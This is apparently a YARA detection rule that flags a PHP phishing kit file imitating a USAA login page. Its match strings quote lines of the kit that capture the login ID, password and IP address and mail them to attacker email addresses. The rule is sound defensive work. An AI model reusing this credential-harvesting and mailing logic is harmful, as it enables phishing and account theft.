rule infected_08_16_18_usaa_page_phishing_first {
  meta:
    description = "phishing - file first.php"
    author      = "Brian Laskowski"
    reference   = "https://github.com/Hestat/lw-yara/"
    date        = "2018-08-16"
    hash1       = "681caec18a82b9dfe60b5fccb94604ec06620ae72537792a7a3d81faa86f3a4b"

  strings:
    $s1  = "$message .= \"--------------Usaa Login Info-----------------------\\n\";" fullword ascii
    $s2  = "$message .= \"Login ID            : \".$_POST['formtext1'].\"\\n\";" fullword ascii
    $s3  = "$send = \"mandrell009@gmail.com,born.last@yandex.com\";" fullword ascii
    $s4  = "$message .= \"Password             : \".$_POST['formtext2'].\"\\n\";" fullword ascii
    $s5  = "$headers = \"From: Usaa result<customer-support@mrs>\";" fullword ascii
    $s6  = "$headers .= \"MIME-Version: 1.0\\n\";" fullword ascii
    $s7  = "$ip = getenv(\"REMOTE_ADDR\");" fullword ascii
    $s8  = "$headers .= $_POST['eMailAdd'].\"\\n\";" fullword ascii
    $s9  = "mail($send,$subject,$message,$headers);" fullword ascii
    $s10 = "mail($to,$subject,$message,$headers);" fullword ascii
    $s11 = "$message .= \"---------------Created BY Unknown-------------\\n\";" fullword ascii
    $s12 = "$subject = \"Result from -$ip\";" fullword ascii

  condition:
    (uint16(0) == 0x3f3c and
      filesize < 2KB and
      (8 of them)
    ) or (all of them)
}